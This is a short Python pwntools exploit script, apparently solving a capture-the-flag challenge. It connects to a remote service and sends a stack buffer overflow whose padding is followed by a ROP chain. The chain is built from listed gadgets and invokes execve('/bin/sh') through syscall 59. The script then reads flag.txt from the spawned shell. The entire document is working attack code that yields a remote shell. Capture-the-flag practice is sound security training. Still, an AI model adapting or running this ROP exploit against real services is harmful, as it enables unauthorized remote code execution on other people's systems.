from pwn import *
context.arch = 'amd64'
r = remote('10.113.184.121', 10052)
#0x0000000000401f0f : pop rdi ; ret
#0x0000000000409f7e : pop rsi ; ret
#0x0000000000485e0b : pop rdx ; pop rbx ; ret
#0x0000000000450087 : pop rax ; ret
#0x0000000000401cc4 : syscall
#0x498027 - 0x49802e  →   "/bin/sh"
shell = 0x498027
pop_rdi = 0x0000000000401f0f
pop_rsi = 0x0000000000409f7e
pop_rdx_rbx = 0x0000000000485e0b
pop_rax = 0x0000000000450087
syscall = 0x0000000000401cc4

rop = flat([pop_rdi, shell, 
            pop_rsi, 0, 
            pop_rdx_rbx, 0, 0, 
            pop_rax, 59, 
            syscall])

payload = b'A' * 0x18 + rop

r.recvuntil(b'> ')
r.sendline(payload)
r.sendline(b'cat /home/chal/flag.txt')
print(r.recvline())
r.close()
